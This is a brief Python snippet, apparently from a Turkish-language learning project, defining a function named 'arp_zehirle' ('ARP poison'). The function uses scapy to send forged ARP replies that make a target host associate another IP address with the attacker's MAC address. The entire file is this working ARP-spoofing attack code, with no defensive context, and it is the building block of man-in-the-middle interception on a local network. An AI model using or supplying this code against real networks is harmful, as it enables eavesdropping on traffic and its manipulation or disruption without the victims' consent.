import scapy.all as scapy

def arp_zehirle(target_ip,poisoned_ip,target_mac):

    arp_istegi = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_istegi,verbose=False)